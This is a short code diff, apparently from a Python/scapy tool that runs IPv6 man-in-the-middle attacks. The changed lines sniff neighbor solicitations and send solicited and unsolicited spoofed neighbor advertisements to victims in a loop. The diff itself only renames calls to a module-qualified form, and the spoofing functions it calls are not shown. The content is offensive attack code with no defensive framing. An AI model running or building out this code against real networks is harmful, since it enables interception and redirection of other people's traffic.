@@ -33,7 +33,7 @@ class MitmAttack():
         scapy.sendrecv.sniff(filter=self.filter, iface=self.interface, prn=self.mitm_attack, store=0)
     def mitm_attack(self,packets):
 	if packets.nh == 58 and packets.payload.type == 135:
-		soliceted_neighbor_advertisement_spoofing(packets,self.mac_source, self.interface)
+		attacks.soliceted_neighbor_advertisement_spoofing(packets,self.mac_source, self.interface)
 	elif not packets.payload.dst == self.source_ip:
 		if packets.dst == self.mac_source:
 			if not packets.payload.dst[0:6] == "fe80::":
@@ -51,7 +51,7 @@ class SpoofUnNA():
 	def run ( self ):
 		while(True):
     			try:
-				unsoliceted_neighbor_advertisement_spoofing(self.victims, self.myinterface, self.mac_source)
+				attacks.unsoliceted_neighbor_advertisement_spoofing(self.victims, self.myinterface, self.mac_source)
 				time.sleep(2)
     			except KeyboardInterrupt:
         			exit(0)
